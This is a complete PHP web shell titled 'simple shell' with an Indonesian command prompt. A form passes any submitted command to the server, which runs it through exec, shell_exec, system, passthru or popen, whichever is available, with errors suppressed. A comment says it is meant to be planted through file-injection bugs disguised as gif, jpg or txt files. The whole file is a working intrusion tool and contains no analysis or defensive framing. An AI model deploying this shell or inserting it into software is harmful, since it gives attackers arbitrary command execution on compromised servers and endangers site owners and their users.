<div align="center"><table><tr><td>&nbsp;</td>
<td><h1>simple shell</h1></td>
<td>&nbsp;</td></tr><tr>
<td>&nbsp;</td>
<td><form method='post'><div style="border:1px solid #333;width:700px;padding:5px;">
PERINTAH:
<input type='text' name='cmd' value="<?php echo stripslashes(htmlentities($_POST['cmd'])); ?>" size="69"/>
<input type='submit' name='run' value='>>'/></div></form></td>
<td>&nbsp;</td>
</tr>
<tr><td>&nbsp;</td>
<td>Result:<br /><pre>
<?
$cmd = $_POST['cmd'];
  // CMD - To Execute Command on File Injection Bug ( gif - jpg - txt )
  if (isset($chdir)) @chdir($chdir);

function ex($cmd)
{
 $output = '';
 if (!empty($cmd))
 {
  if(function_exists('exec'))
   {
    @exec($cmd,$output);
    $output = join("\n",$output);
   }
  elseif(function_exists('shell_exec'))
   {
    $output = @shell_exec($cmd);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
    $output = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cmd);
    $output = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cmd,"r")))
  {
   $output = "";
   while(!@feof($f)) { $output .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $output;
}
$cmd = print ex($cmd);
  if (!empty($output)) echo str_replace(">", ">", str_replace("<","<", $output));
?>
</font></pre>
<hr color="black" width=751px height=115px>
         <SCRIPT LANGUAGE="JavaScript">
         <!--
           document.injection.cmd.focus();
         //-->
         </SCRIPT>

</td><td>&nbsp;</td>
</tr></table></div>
<?php
exit;
?> 
